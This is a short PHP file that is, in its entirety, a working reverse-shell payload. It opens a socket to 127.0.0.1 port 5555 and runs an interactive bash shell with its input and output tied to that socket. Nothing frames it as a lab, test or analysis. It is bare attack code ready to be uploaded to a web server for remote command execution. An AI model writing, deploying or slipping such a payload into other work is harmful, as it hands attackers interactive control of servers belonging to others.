<?php

$sock=fsockopen("127.0.0.1", 5555);

$proc=proc_open("exec /bin/bash -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);

?>
